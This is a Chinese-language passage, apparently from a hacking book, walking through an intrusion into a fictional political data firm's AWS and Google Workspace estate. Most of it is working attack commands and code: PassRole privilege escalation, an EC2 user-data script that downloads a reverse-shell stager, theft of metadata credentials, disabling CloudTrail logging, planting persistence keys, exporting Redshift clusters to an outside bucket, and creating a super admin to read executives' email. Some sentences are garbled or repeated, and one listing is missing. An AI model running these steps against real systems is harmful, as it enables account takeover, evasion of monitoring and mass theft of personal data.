Gretsch Politico 每天都用其庞大的数据专家队伍进行这种处理。我们不能利用他们的工作来窃取最终结果，而不是从头开始重新发明轮子吗？

## Stealing Processed Data

在 Spark 上进行数据处理和数据转换通常只是数据生命周期的第一步。一旦数据与其他输入丰富、交叉引用、格式化并扩展后，就会存储在第二种介质上。在那里，分析师（通常通过某种类 SQL 引擎）可以探索它，并最终将其输入到训练算法和预测模型（当然，这些模型可能在 Spark 上运行，也可能不在）。

问题是，GP 将其丰富和处理后的数据存储在哪里？最快的方法是搜索 Jupyter 笔记本中分析工具提及、类 SQL 查询、图表和仪表板等的线索（参见列表 12-9）。



`root@Point1:~notebooks/# egrep -R -5 "sql|warehouse|snowflake|redshift|bigquery" *`

`redshift_endpoint = "sandbox.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com"`

```
engine_string = "postgresql+psycopg2://%s:%s@%s:5439/datalake" \
% ("analytics-ro", "test", redshift_endpoint)

engine = create_engine(engine_string)

sql = """

select insertion_id, ctr, cpm, ads_ratio, segmentID,...;

"""

--snip--
```

列表 12-9：Jupyter 笔记本中使用的 SQL 查询

也许我们找到了值得调查的东西。`Redshift`是一种增强版的托管`PostgreSQL`数据库，以至于称其为数据库已不再合适。它通常被称为数据湖。对于查询只有 1,000 行的小表来说它几乎毫无用处，但给它几 TB 的数据进行摄取，它就会以闪电般的速度响应！只要 AWS 有空闲服务器（当然客户也有钱花），其容量就可以扩展。

其显著的速度、可扩展性、并行上传能力和与 AWS 生态系统的集成使`Redshift`成为该领域最有效率的分析数据库之一——它很可能是我们得救的关键！

不幸的是，我们获取的凭证属于一个包含无关数据的沙箱数据库。此外，我们的任何 AWS 访问密钥都无法直接查询`Redshift` API：

```
root@Point1:~/# aws redshift describe-clusters \
--profile=data1 \
--region eu-west-1

An error occurred (AccessDenied) when calling the DescribeClusters...
```

看来是时候进行一些权限提升了。

## Privilege Escalation

浏览我们获得的十几个 IAM 访问密钥后，我们意识到它们都属于同一个 IAM 组，因此共享相同的基本权限——即对几个存储桶的读写权限，加上一些轻量的只读 IAM 权限：

```
root@Point1:~/# aws iam list-groups --profile=leslie
"GroupName": "spark-s3",

root@Point1:~/# aws iam list-groups --profile=marc
"GroupName": "spark-s3",

root@Point1:~/# aws iam list-groups --profile=camellia
"GroupName": "spark-debug",
"GroupName": "spark-s3",
--snip--
```

等等。`Camellia`还属于一个名为`spark-debug`的额外组。让我们仔细看看附加到该组的策略：

```
root@Point1:~/# aws iam list-attach-group-policies --group-name spark-debug --profile=camellia
"PolicyName": "AmazonEC2FullAccess",
"PolicyName": "iam-pass-role-spark",
```

太好了。这里的`Camellia`很可能负责维护和运行`Spark`集群，因此她被授予了这两个策略。`EC2`完全访问权限打开了对`EC2`的 450 多种可能操作的大门，从启动实例到创建新的`VPC`、子网，以及几乎所有与计算服务相关的操作。

第二个策略是定制的，但我们可以很容易猜出它意味着什么：它允许我们为`EC2`实例分配角色。我们查询策略文档的最新版本来证实我们的猜测：

```
# get policy version
root@Point1:~/# aws iam get-policy \
--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \
--profile camellia
"DefaultVersionId": "v1",

# get policy content
root@Point1:~/# aws iam get-policy-version \
--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \
--version v1 \
--profile camellia
"Action":"iam:PassRole",
```

```
"Resource": "*"
--snip--
```

`GP`可能并未完全意识到这一点，但通过`IAM PassRole`操作，他们已隐式地将亲爱的`Camellia`——以及由此延伸的我们——对他们`AWS`账户的完全控制权授予了。`PassRole`是一种强大的权限，允许我们将角色分配给实例。任何角色 ①。甚至是管理员角色。有了`EC2`完全访问权限，`Camellia`还可以管理`EC2`实例并启动机器，为其分配管理员角色，从而接管`AWS`账户。

> NOTE
与`MXR Ads`不同，`GP`甚至没有费心限制对发起调用的用户进行`IAM`只读调用——这是许多公司常见的疏忽，它们默认向用户分配`IAM list*`和`get*`权限。

让我们探索一下作为`Camellia`，我们可以传递给`EC2`实例的角色有哪些选项。唯一的限制是该角色需要在其信任策略中包含`ec2.amazonaws.com`：

```
root@Point1:~/# aws iam list-roles --profile camellia \
| jq -r '.Roles[] | .RoleName + ", " + \
.AssumeRolePolicyDocument.Statement[].Principal.Service' \
| grep "ec2.amazonaws.com"
--snip--
jenkins-cicd, ec2.amazonaws.com
jenkins-jobs, ec2.amazonaws.com
rundeck, ec2.amazonaws.com
spark-master, ec2.amazonaws.com
```

在我们看到的角色中，有`rundeck`，这可能正是我们承诺的救世主。`Rundeck`是一个用于在基础设施上运行管理员脚本的自动化工具。`GP`的基础设施团队似乎不太热衷于使用`Jenkins`，因此他们可能将大部分工作负载安排在了`Rundeck`上。让我们使用`Camellia`来查看`rundeck`具有哪些权限：

```
root@Point1:~/# aws iam get-attached-role-policies \
--role-name rundeck \
--profile camellia
"PolicyName": "rundeck-mono-policy",

# get policy version
root@Point1:~/# aws iam get-policy --profile camellia \
--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy
"DefaultVersionId": "v13",

# get policy content
root@Point1:~/# aws iam get-policy-version \
--version v13 \
--profile camellia \
--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy
"Action":["ec2:*", "ecr:*", "iam:*", "rds:*", "redshift:*",...]
"Resource": "*"
--snip--
```

是的，这就是我们需要的角色。`rundeck`角色在`AWS`上拥有接近完全的管理员权限。

因此，计划是在与`Spark`集群相同的子网中启动一个实例。我们仔细复制相同的属性以隐藏在众目睽睽之下：安全组、标签，一切。我们正在查找这些属性，以便日后可以模仿它们：

```
root@Point1:~/# aws ec2 describe-instances --profile camellia \
--filters 'Name=tag:Name,Values=*spark*'
--snip--
"Tags":
    Key: Name  Value: spark-master-streaming
"ImageId": "ami-02df9ea15c1778c9c",
```



"InstanceType": "m5.xlarge",

"SubnetId": "subnet-00580e48",

"SecurityGroups":

    GroupName: spark-master-all, GroupId: sg-06a91d40a5d42fe04

    GroupName: spark-worker-all, GroupId: sg-00de21bc7c864cd25

--snip--

我们确切知道 Spark 工作节点可以通过 `443` 端口访问互联网，因此我们只是懒惰地复制并粘贴刚刚确认的安全组，并使用这些属性以 rundeck 配置文件启动一个新实例：

```
root@Point1:~/# aws ec2 run-instances \
--image-id ami-02df9ea15c1778c9c \
--count 1 \
--instance-type m3.medium \
--iam-instance-profile rundeck \
--subnet-id subnet-00580e48 \
--security-group-ids sg-06a91d40a5d42fe04 \
--tag-specifications 'ResourceType=instance,Tags= [{Key=Name,Value=spark-worker-5739ecea19a4}]' \
--user-data file://my_user_data.sh \
--profile camellia \
--region eu-west-1
```

作为用户数据传递的脚本 (`my_user_data.sh`) 将引导我们的反向 shell：

```
#!/bin/bash

wget https://gretsch-spark-eu.s3.amazonaws.com/stager

chmod +x ./stager

./stager&
```

我们运行上述 AWS 命令，果然，一两分钟后我们获得了我们希望的最后一个 shell，并附带管理员权限：

```
[*] https://0.0.0.0:443 handling request from...
[*] https://0.0.0.0:443 handling request from...
msf exploit(multi/handler) > sessions -i 9
[*] Starting interaction with 9...
meterpreter > execute -i -H -f curl -a \
http://169.254.169.254/latest/meta-data/iam/security-credentials/rundeck
"AccessKeyId" : "ASIA44ZRK6WS36YMZOCQ",
"SecretAccessKey" : "rX80A+2zCNaXqHrl2awNOCyJpIwu2FQroHFyfnGn",
"Token" : "IQ0Jb3jPZ1uXv2XjEj/////////////wEaCNV1LXdc1c3QtMSJ...
```

太棒了！我们获得了属于 `rundeck` 角色的一大堆顶级安全级别的密钥和令牌。现在我们有了这些密钥，让我们查询可能暴露的经典服务，以查看哪些处于活跃状态（CloudTrail、GuardDuty 和 Access Analyzer）：

```
root@Point1:~/# export AWS_PROFILE=rundeck
root@Point1:~/# export AWS_REGION=eu-west-1
root@Point1:~/# aws cloudtrail describe-trails
    "Name": "aggregated",
    "S3BucketName": "gretsch-aggreg-logs",
    "IncludeGlobalServiceEvents": true,
    "IsMultiRegionTrail": true,
    "HomeRegion": "eu-west-1",
    ⓘ "HasInsightSelectors": false,
root@Point1:~/# aws guardduty list-detectors
"DetectorIds": []
root@Point1:~/# aws accessanalyzer list-analyzers
"analyzers": []
```

好的。CloudTrail 如预期已启用，因此日志可能成为问题。那里没有太大惊喜。不过 Insights 已禁用 ⓘ，因此如果需要，我们可以承受一些批量写入 API 调用。GuardDuty 和 Access Analyzer 返回空列表，因此两者也都不在组合中。

让我们暂时遮蔽日志轨迹，并在 Camellia 的用户账户中插入一个访问密钥以提高我们的持久性。如果我们想重新获得对 GP 账户的访问权限，她的权限已经足够：

```
root@Point1:~/# aws cloudtrail update-trail \
--name aggregated \
--no-include-global-service-events \
--no-is-multi-region
root@Point1:~/# aws iam list-access-keys --user-name camellia
"AccessKeyId": "AKIA4ZRK6WSXNQGVUX7",
"Status": "Active",
"CreateDate": "2019-12-13T18:26:17Z"
root@Point1:~/# aws iam create-access-key --user-name camellia
{
  "AccessKey": {
    "UserName": "camellia",
    "AccessKeyId": "AKIA4ZRK6WSS2RB4CUX",
    "SecretAccessKey": "10k//uyLSPoc6VkveOMFdpZFf5wWvsTwX/fLT7Ch",
    "CreateDate": "2019-12-21T18:20:04Z"
  }
}
```

三十分钟后，我们清理 EC2 实例并重新启用 CloudTrail 多区域日志记录：

```
root@Point1:~/# aws cloudtrail update-trail \
--name aggregated \
--include-global-service-events \
--is-multi-region
```

最后！我们获得了对 GP AWS 账户的稳定管理员访问权限。

## 渗透 Redshift

现在我们已经获得了对 GP AWS 账户的访问权限，让我们四处查看其 Redshift 集群（参见列表 12-10）。毕竟，这正是我们接管该账户的主要动机。

```
root@Point1:~/# aws redshift describe-clusters
"Clusters": [
ClusterIdentifier: bi,
  NodeType: ra3.16xlarge, NumberOfNodes: 10,
  "DBName": "datalake"
--snip--
ClusterIdentifier: sandbox
  NodeType: dc2.large,  NumberOfNodes: 2,
  "DBName": "datalake"
--snip--
ClusterIdentifier: reporting
  NodeType: dc2.8xlarge, NumberOfNodes: 16,
  "DBName": "datalake"
--snip--
ClusterIdentifier: finance, NodeType: dc2.8xlarge
  NumberOfNodes: 24,
  "DBName": "datalake"
--snip--
```

列表 12-10：列出 Redshift 集群

我们获得了在 Redshift 上运行的一堆集群，其中包含有价值的信息。Redshift 是一个不错的猜测。你不会仅仅为了好玩就创建一个支持每个节点 2.5TB 的 `ra3.16xlarge` 集群 ①。那东西每天的费用很容易超过 3000 美元，这使得探索它更具诱惑力。`finance` 集群也可能包含一些有趣的数据。

让我们放大列表 12-10 中 `bi` 集群的信息。当集群启动时创建的初始数据库称为 `datalake`。管理员用户是传统的 `root` 用户。集群可通过地址 `bi.cae0svj50m2p.eu-west-1.redshift.amazonaws.com` 在 `5439` 端口访问：

```
Clusters: [
ClusterIdentifier: sandbox-test,



`NodeType`: `ra3.16xlarge`,

`MasterUsername`: `root`

`DBName`: `datalake`,

`Endpoint`: {

  `Address`: `bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com`,

  `Port`: `5439`

}

`VpcSecurityGroupId`: `sg-9f3a64e4`, `sg-a53f61de`, `sg-042c4a3f80a7e262c`

--snip--

```
我们查看安全组，看看是否有可能阻止直接连接到数据库的过滤规则：
```

```
root@Point1:~/# aws ec2 describe-security-groups \
--group-ids sg-9f3a64e4 sg-a53f61de
"IpPermissions": [ {
  "ToPort": 5439,
  "IpProtocol": "tcp",
  "IpRanges": [
    { "CidrIp": "52.210.98.176/32" },
    { "CidrIp": "32.29.54.20/32" },
    { "CidrIp": "10.0.0.0/8" },
    { "CidrIp": "0.0.0.0/0" },
```
我有史以来最喜欢的 IP 范围：`0.0.0.0/0`。这个未过滤的 IP 范围可能只是作为临时访问授予，用于测试新的 SaaS 集成或运行一些查询……然而我们就在这里。公平地说，由于我们已经可以访问 GP 的网络，这对我们来说意义不大。损害已经造成。

Redshift 与 IAM 服务紧密耦合，因此我们不需要去寻找数据库的凭证。由于我们的 rundeck 角色附带了一个漂亮的 `redshift:*` 权限，我们只需为数据库上的任何用户账户（包括 `root`）创建一个临时密码：

```
root@Point1:~/# aws redshift get-cluster-credentials \
--db-user root \
--db-name datalake\
--cluster-identifier bi \
--duration-seconds 3600
```

```
"DbUser": "IAM:root",
"DbPassword": "AskFx8eXiOn1kMLKIxPHkvwfXoFSSewm5gAheaQYhTCokEe",
"Expiration": "2020-12-29T11:32:25.755Z"
```

凭借这些数据库凭证，只需下载 PostgreSQL 客户端并将其指向 Redshift 端点即可：

```
root@Point1:~/# apt install postgresql postgresql-contrib
root@Point1:~/# PGPASSWORD='AskFx8eXiOn1kMLKIx...' \
psql \
-h bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com \
-U root \
-d datalake \
-p 5439
-c "SELECT tablename, columnname FROM PG_TABLE_DEF where schemaname \
='public'" > list_tables_columns.txt
```

我们导出一份全面的表和列清单（存储在 `PG_TABLE_DEF` 表中），并迅速锁定有趣的数据：

```
root@Point1:~/# cat list_tables_columns.txt
profile, id
profile, name
profile, lastname
profile, social_id
--snip--
social, id
social, link
social, fb_likes
social, fb_interest
--snip--
taxonomy, segment_name
taxonomy, id
taxonomy, reach
taxonomy, provider
--snip--
interestgraph, id
interestgraph, influence_axis
interestgraph, action_axis
--snip--
```

没有什么能比得上一个好老式的 SQL 数据库，我们可以在其中尽情查询和连接数据！这个 Redshift 集群是几乎所有流入 Gretsch Politico 基础设施的数据输入的交汇点。

我们找到了与 MXR Ads 表现相关的数据，以及它对人们在线行为产生的影响。我们拥有他们的完整在线活动记录，包括他们访问过的每个带有与 GP 相关的 JavaScript 标签的网站列表，甚至还有那些天真到与 GP 的隐藏合作伙伴共享此类数据的人所关联的社交媒体资料。当然，我们还有从数据提供商那里购买的经典数据细分，以及他们所称的“相似受众细分”——也就是说，将人口 A 的兴趣投射到人口 B 上，因为它们共享某些共同属性，比如使用的设备、行为等等。

我们尝试构建一个 SQL 查询，将这些数据的大部分编译成单一输出，以便更清晰地可视化正在发生的事情：

```
SELECT p.gp_id, p.name, p.lastname, p.deviceType, p.last_loc,
LISTAGG(a.referer), s.link, LISTAGG(s.fb_interest),
LISTAGG(t.segment_name),
i.action_y, i.influence_x, i.impulse_z
FROM profile p
JOIN ads a on p.ads_id = a.id
JOIN social s on p.social_id= s.id
JOIN taxonomy t on p.segment_id = t.id
JOIN interestgraph i on p.graph_id = i.id
GROUP BY p.gp_id
LIMIT 2000
```

## 鼓点，请。准备好了吗？开始！这里有一位客户，Francis Dima：

```
p.gp_id: d41d8cd98f00b204e9800998ecf8427e
p.name: Dima
p.lastname: Francis
p.deviceType: iphone X
p.last_loc_x: 50.06.16.3.N
p.last_loc_y: 8.41.09.3.E
a.referer: www.okinawa.com/orderMeal,
transferwise.com/90537e4b29fb87fec18e451...,
aljazeera.com/news/hong-kong-protest...
s.link: https://www.facebook.com/dima.realworld.53301
s.fb_interest: rock, metoo, fight4Freedom, legalizeIt...
t.segment_name:politics_leaned_left,
politics_manifesto... rally,
health_medicine_average,
health_chronic_pain,...
i.influence_x: 60
i.action_y: 95
i.impulse_z: 15
--snip--
```

通过聚合几个追踪器，你能了解人们的种种事情。可怜的 Dima 与超过 160 个数据细分相关联，描述了他从政治活动到烹饪习惯和医疗历史的一切。我们拥有他访问过的最后 500 个完整 URL、他最后已知的地理位置、他充满点赞和兴趣的 Facebook 资料，最重要的是，一张人物地图列出了他的影响力、冲动程度和广告互动水平。有了这些信息，就想想 GP 要针对这个人——任何人——影响他们对无数极化主题的看法会有多容易……嗯……把民主卖给出价最高的人。

财务集群是另一个活生生的埃尔多拉多。不仅仅是交易数据，它包含了有关每个对 Gretsch Politico 服务表现出一点点兴趣的客户的每一点可能信息，以及他们订购的创意素材：

```
c.id: 357
c.name: IFR
c.address: Ruysdaelkade 51-HS
c.city: Amsterdam
c.revenue: 549879.13
c.creatives: s3://Gretsch-studio/IFR/9912575fe6a4av.mp4,...
c.contact: jan.vanurbin@udrc.com
p.funnels: mxads, instagram, facebook,...
click_rate: 0.013
real_visit: 0.004
--snip--
```



`unload ('<HUGE_SQL_QUERY>') to 's3://data-export-profiles/gp/'`

我们将这两个集群完整导出到我们拥有的 S3 存储桶中，并开始准备下一步行动——一场新闻发布会、一部电影，也许是一本书。谁知道呢？

### 资源

- 基于 Spark 的公司列表：https://spark.apache.org/powered-by.html.
- 来自 Apache Spark 文档的 Spark 操作列表：http://bit.ly/3aW64Dh.
- Redshift 价格详情：https://aws.amazon.com/redshift/pricing/.
- 有图示的 map 和 FlatMap 的更多详情：https://data-flair.training/blogs/apache-spark-map-vs-flatmap/.

## 13

## 最终剪辑

![](img/961e81aef23040d0fbe348f58c055860_245_0.png)

回顾我们迄今为止的成就，我们已经成功获取了在 MXR Ads 服务器上运行的政治广告，完整包含预算数据、创意素材以及背后的真实组织。此外，我们下载了 GP 收集的数亿个人的画像数据，每个档案都像一本个人日记，可用于指控、勒索或压制甚至最有权势的人。我们还能想要什么呢？

好吧，这份奖项清单中缺少一样东西：公司电子邮件。黑客攻击电子邮件实在太经典了，我不能不谈论它就结束这本书。

当我们在 Windows Active Directory 中获取域管理员凭证时，对电子邮件的无限访问自然随之而来。在 Windows 环境中，基础设施和企业目录是绑定在一起的。

AWS 的情况不同。它从未打算征服企业 IT 市场。那个领域早已被 Active Directory 和 Google Workspace（前身为 G Suite）等占据。

大多数完全依赖 AWS 或 Google Cloud Platform（GCP）来构建和托管其业务产品的科技公司会转向 Google Workspace 作为其企业目录。你可以尽情讨厌 Google，但 Gmail 仍然是最全面的电子邮件平台。（就管理电子邮件而言。隐私的打击可能不值得，但那是另一个争论。）

这通常会导致两个独立的 IT 团队：一个负责交付核心技术产品的基础设施，另一个负责 IT 的企业方面（电子邮件、打印机、工作站、帮助台等等）。

快速查询 DNS 邮件交换（MX）记录显示，GP 确实在使用企业版 Gmail，因此很可能也在使用 Google Workspace 中的其他工具，如 Drive、Contacts、Hangouts 等等（见列表 13-1）。

```
root@Point1:~/# dig +short gretschpolitico.com MX

10 aspmx.l.google.com.

20 alt2.aspmx.l.google.com.

30 aspmx3.googlemail.com.

20 alt1.aspmx.l.google.com.

30 aspmx2.googlemail.com.
```

*列表 13-1：MX 记录查询确认 GP 确实在使用 Google Workspace*

关于利用和滥用 Google Workspace 的文献或脚本并不多，所以让我们自己试试。

## 黑客攻击 Google Workspace

我们是 GP AWS 账户的管理员，可以无限访问其所有生产资源，包括服务器、用户、GitHub 账户等等。立即想到的两种策略可以跳到 Google Workspace 环境：

- 找到一个企业内联网应用程序，并用一个假的 Google 身份验证页面替换其主页，在将用户重定向到真实应用之前窃取凭证。
- 搜查代码库中可能与 Google Workspace 环境交互的应用程序，并窃取其凭证以建立第一个立足点。

第一个选项是保证获胜的，前提是我们能很好地模仿那个 Google 身份验证页面。它也风险更大，因为它涉及用户交互。话虽如此，我们已经得到了想要的东西，所以天塌下来也无所谓。这只是额外的奖励。

另一方面，另一种选择要隐蔽得多，但它假设 IT 部门与基础设施的其他部分之间存在我们可以利用的某些联系，例如 Lambda 函数、IAM 角色、S3 存储桶或某个用户——基本上是散落在草堆中的根针……或者真的如此吗？

仔细一想，实际上有一些东西在 IT 部门和基础设施团队之间有很概率被共享：GitHub 账户。他们总不会为了讨好这两个技术团队就注册两个账户吧？

让我们加载从 Jenkins 获取的 GitHub 令牌，并寻找对 Google Workspace、Gmail、Google Drive 等的引用。我们写了一个简短的 Python 脚本来加载仓库名称：

```python
# list_repos.py

from github import Github

g = Github("8e24ffcc0eeddee673ffa0ce5433ffcee7ace561")

for repo in g.get_user().get_repos():
    print(repo.name, repo.clone_url)
```

```bash
root@Point1:~/# python3 list_repos.py > list_repos_gp.txt
root@Point1:~/# egrep -i "it[_-]|gapps|gsuite|users?" list_repos_gp.txt
it-service      https://github.com/gretschp/it-service.git
it-gsuite-apps  https://github.com/gretschp/it-gsuite-apps.git
users-sync      https://github.com/gretschp/users-sync
--snip--
```

这是一个明显的交叉渗透 ① 迹象。我们克隆 `it-gsuite-apps` 的源代码并……你猜怎么着？！它是一个用于自动化许多 Google Workspace 管理操作的应用程序和服务列表，例如用户置备、组织单元 (OU) 分配、终止账户等：

```bash
root@Point1:~/# ls -lh it-gsuite-apps
total 98M
drwxrwxrwx 1 root root  7.9M provisionner
drwxrwxrwx 1 root root 13.4M cron-tasks
drwxrwxrwx 1 root root  6.3M assign-ou
--snip--
```

这些正是我们用来实现对 Google Workspace 控制的操作类型！当然，这个敏感的仓库对普通用户是不可见的，但我猜冒充 Jenkins 有其特殊之处。

我们开始梦想提取 CEO 的电子邮件并揭露这种欺诈性业务，但很快意识到这个仓库中没有包含任何明文密码。

虽然 AWS 依赖于访问密钥（access keys）来身份验证用户和角色，但 Google 选择了 OAuth2 协议，这需要显式的用户交互。本质上，将打开一个浏览器，验证用户，并生成一个验证代码，该代码必须粘贴回命令行以生成临时私密钥来调用 Google Workspace API。

机器无法遵循这种身份验证流程，因此 Google 还提供了可以使用私密钥进行身份验证的服务账户。然而，查看源代码时，我们没有发现任何私密钥的丝倪：

```bash
root@Point1:~/it-gsuite-apps/# grep -Ri "BEGIN PRIVATE KEY" *
root@Point1:~/it-gsuite-apps/#
```

> 注意
> * {是服务账户只能在 Google Cloud Platform (GCP) 上定义。因此，实际上，为了正确使用 Google Workspace，还需要订阅 GCP。当然，文档中完全没有提到这一点，所以你就像神奇地从 Google Workspace 窗口进入了 GCP 平台。*

所以，我们深入 `it-gsuite-apps` 的代码以了解该程序是如何获取 Google Workspace 权限的，并意外发现了列表 13-2 所示的行。

```java
--snip--
getSecret(SERVICE_TOKEN);
--snip--
public static void getSecret(String token) {
    String secretName = token;
    String endpoint = "secretsmanager.eu-west-1.amazonaws.com";
    String region = "eu-west-1";
    AwsClientBuilder.EndpointConfiguration config = new AwsClientBuilder.
--snip--
```



### 列表 13-2：从 AWS Secrets Manager 加载服务令牌的代码片段

现在很合理了。密钥并不是硬编码在应用程序中的，而是通过 Secrets Manager 动态获取的，用于集中存储密钥。我们没有密钥，但幸运的是我们拥有管理员权限，所以可以轻松搜索：

```bash
root@Point1:~/# aws secretsmanager list-secrets \
--region eu-west-1 \
--profile rundeck
"Name": "inf/instance-api/api-token",
"Name": "inf/rundeck/mysql/test",
"Name": "inf/rundeck/log/apikey",
"Name": "inf/rundeck/vpn-employees",
--snip--
```

遗憾的是，无论如何 `grep`，都没有发现任何与 Google Workspace 相关的。。手动检查每个条目后，真相大白：IT 部门必须使用另一个 AWS 账户。这是唯一的解释。

不必恐慌，跳转到 AWS 账户将从 MX 到 GP。

这两个公司是不同的（尽管交织在一起）。它们拥有独立的 AWS 账户。然而，IT 部门与技术团队一样，是支付账单的实体。

最可能的配置是 GP 创建了一个组织，该组织包含多个 AWS 账户：一个用于技术团队，另一个用于 IT 部门，另一个用于测试等。在这种配置中，一个 AWS 账户被提升为“主”状态。这个特殊账户可以用于将新账户添加到组织，并限制每个账户的可用服务。

主账户通常没有任何基础设施，并且在理想世界中，它应该将任务（如日志聚合、报告等）委托给其他账户。我们可以通过使用强大的 `rundeck` 角色调用 `list-accounts` API 来轻松证实我们的假设：

```bash
root@point1:~/# aws organizations list-accounts
"Accounts": [
  Id: 983457354409, Name: Infra, Email: infra-admin...
  Id: 354899546107, Name: GP, Email: ...
  Id: 123456789012, Name: IT, Email: ...
]
```

### 列表 13-3：列出账户

主账户通常没有任何基础设施，并且在理想世界中，它应该将任务（如日志聚合、报告等）委托给其他账户。我们可以通过使用强大的 `rundeck` 角色调用 `list-accounts` API 来轻松证实我们的假设。

看起来不错。正如预料的那样，我们看到了管理员。

```json
AccessKey: {
    UserName: elis.skyler,
    AccessKeyId: AKIA44ZRK6WSRDLX7TDS,
    SecretAccessKey: 564//eyApoe96Dkvo0EdgAwroak78eghk
}
```

使用这些新凭据，我们请求属于 `OrganizationAccountAccessRole` 的临时 AWS 密钥：

```bash
root@Point1:~/# aws sts assume-role \
--role-session-name maintenance \
--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \
--profile elis \
--duration-seconds 43200
```

```bash
AccessKeyId: ASIAU6EUDNIZIADAP6BQ,
SecretAccessKey: xn37rimjEAppjDicZZP19hOhLuTo2P06SXZxeHbk,
SessionToken: FwoGZXlVYXdzEGwa...
```

其实并没有那么难。好吧，让我们使用这些访问凭据来查找新账户中的 AWS Secrets Manager：

```bash
root@Point1:~/# aws secretsmanager list-secrets \
--region eu-west-1 \
--profile it-role
```

```text
ARN: arn:aws:secretsmanager:eu-west-1:345673068670:secret:it/gsuite-apps/user-provisionning-40YxPA
Name: it/gsuite-apps/user-provisionning,
--snip--
```

太棒了。我们获取密钥内容并将其解码，以提取用于身份 Google 服务服务的 JSON 文件（见列表 13-5）。

```bash
root@Point1:~/# aws secretsmanager get-secret-value \
--secret-id 'arn:aws:secretsmanager:eu-west-1:345673068670:secret:it/gsuite-apps/user-provisionning-40YxPA' \
--region=eu-west-1 \
--profile it-role \
| jq -r .SecretString | base64 -d
```

```json
{
    "type": "service_account",
    "project_id": "gp-gsuite-262115",
    "private_key_id": "05a85fd168856773743ed7ccf8828a522a00fc8f",
    "private_key": "-----BEGIN PRIVATE KEY-----... ",



`"client_email": "userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com"`,

`"client_id": "100598087991069411291"`,

--snip--

}

```

列表 13-5：获取 GCP 服务账户密钥

该服务账户名为 `userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com`，属于 Google Cloud 项目 `gp-gsuite-262115`。请注意，不是 Google Workspace，而是 Google Cloud。由于 Google Workspace 不处理服务令牌，任何想要自动化其 Google Workspace 管理的人都必须在 Google Cloud 上创建一个服务令牌，然后并在 Google Workspace 上为该账户分配范围和权限。没有比这更糟的了！

我们已经知道这个服务令牌具有创建用户所需的权限，所以让我们在 Google Workspace 上获取一个超级管理员账户吧。

# 创建 Google Workspace 超级管理员账户

你可以在书的 GitHub 仓库中找到完整的 Python 代码，文件为 `create_user.py`，因此我只需强调关键点。

首先，我们需要声明我们的账户在 Google Workspace 上执行操作的范围。由于我们将创建一个新账户，我们需要 `admin.directory.user` 范围。我们通过服务令牌文件的位置以及我们将模拟的电子邮件来实现这一点：

```python
SCOPES = ['https://www.googleapis.com/auth/admin.directory.user']

SERVICE_ACCOUNT_FILE = 'token.json'

USER_EMAIL = "admin-it@gretschico.com"
```

在 Google 安全模型中，服务账户无法直接操作用户；它首先需要通过域范围授权（domain-wide delegation）模拟一个真实用户。操作随后通过模拟用户的权限执行。我们最好尝试在列表 13-3 中找到服务账户邮箱：`admin-it@gretschico.com`。

接下来是构建 Google Workspace 客户端并模拟管理员的模板代码：

```python
credentials = service_account.Credentials.from_service_account(SERVICE_ACCOUNT_FILE, scopes=SCOPES)

delegated_credentials = credentials.with_subject(USER_EMAIL)

service = discovery.build('admin', 'v1', credentials=delegated_credentials)
```

我们构建包含包含用户属性（名称、密码等）的字典，然后执行：

```python
user = {
    "familyName": "Burton",
    "givenName": "Hannah",
    "password": "StrongPassword",
    "primaryEmail": "hanielle@gretschico.com",
    "orgUnitPath": "/"
}

result = service.users().insert(body=user).execute()
```

最后一步是让我们的用户成为整个组织的超级管理员：

```python
service.users().makeAdmin(user="hanielle@gretschico.com", body={"status": True}).execute()
```

现在我们只需运行该文件：

```bash
root@Point1:~# python create_user.py
```

没有错误。真的成功了吗？我们打开浏览器进入 Google Workspace 管理控制 https://admin.google.com/，如图 13-1 所示。该死的！我们刚刚获得了 GP 目录的管理员权限。没有什么无法触及：Gmail、Google Drive 等。

# 偷窥

为了保持低调，我们将避免使用 Google Workspace 的导出和数据迁移工具。当任何人触发这些任务时，Google 会自动警告管理员。我们目前完全通过 API 调用与 Google Workspace 交互。我们只需要从 Secrets Manager 获取的用户配置服务账户的范围包含 Gmail 和 Google Drive。

在 Google Workspace 管理控制中，导航到安全 ▶ 高级设置 ▶ API 访问，并在图 13-2 所示的“添加范围”字段中输入以下两个范围：

- https://www.googleapis.com/auth/drive
- https://www.googleapis.com/auth/gmail.readonly

由于你需要输入分配给服务账户的所有范围（旧的和新的）。

我们创建一个新的 `gmail.py` Python 脚本，使用与创建用户相同的模板代码，但有几处改动：

```python
USER_EMAIL = 'alexandra.styx@gretschico.com'

service = discovery.build('gmail', 'v1', credentials=delegated_credentials)

results = service.users().messages().list(
    userId=USER_EMAIL,
    labelIds = ['INBOX']).execute()

messages = results.get('messages', [])
```

我们更新范围包含 Gmail，然后调用 `users().messages()` API 来获取 CEO 的邮件，他的名字是从 LinkedIn 上高兴获取的。

然后只需遍历邮件，提取主题、发送者、接收者和邮件正文即可。访问 https://github.com/HackLikeAPornstar/GreschPolitico 查看完整代码。我们运行完整的 Python 脚本，闲地翻阅邮件：

```bash
root@Point1:~/# python gmail.py

alexandra.styx@gretschico.com;
valery.attenbourrough@gretschico.com;
Sun, 15 Dec 2020;
获得了政党的合同 - 200 万！
我们今天刚刚签了合同！明天就可以开始针对 PA 的未决选民了！

---
alexandra.styx@gretschico.com;
adam.sparrow@gretschico.com;
Sun, 12 Dec 2020;
我们需要对付他的公众形象
我们不能编个故事吗？送一些女孩、香槟并以此方式启动？我们的素材已经准备就绪，我们需要行动起来了！！！
女士们、先生们，这就是光彩夺目的 Gretsch Politico！是时候挖黑料了。
```

# 结语

哇，我们走到最后了。这是一段充满许多技术和新范式的密集旅程。云计算的泛化可能是过去十年中最具破坏性的事件之一。尽管许多科技公司和初创企业已经在拥抱云，但我觉得安全社区仍然落后。我读到的每篇关于横向移动、C2 通信的文章都专门涵盖 Active Directory——就好像最有价值的数据一定存储在 Windows 共享或 SQL 服务器上。事实上，正如我们在这个场景中看到的，越来越多的科技公司正在离开 Windows。也许是由于那些深陷 Active Directory 的旧咨询公司引入了偏见。也可能是因为市场上充斥着 Windows CVE（常见漏洞与披露）。可能两者兼有。

